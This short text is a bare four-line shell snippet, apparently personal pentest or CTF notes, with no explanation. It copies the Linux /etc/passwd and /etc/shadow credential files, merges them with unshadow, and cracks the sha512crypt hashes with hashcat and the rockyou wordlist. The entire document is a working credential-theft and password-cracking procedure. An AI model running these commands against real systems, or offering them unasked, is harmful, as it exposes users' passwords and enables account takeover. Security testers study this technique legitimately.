
cat /etc/passwd > passwd.txt
cat /etc/shadow > shadow.txt
unshadow passwd.txt shadow.txt > unshadowed.txt
hashcat -m 1800 unshadowed.txt rockyou.txt -O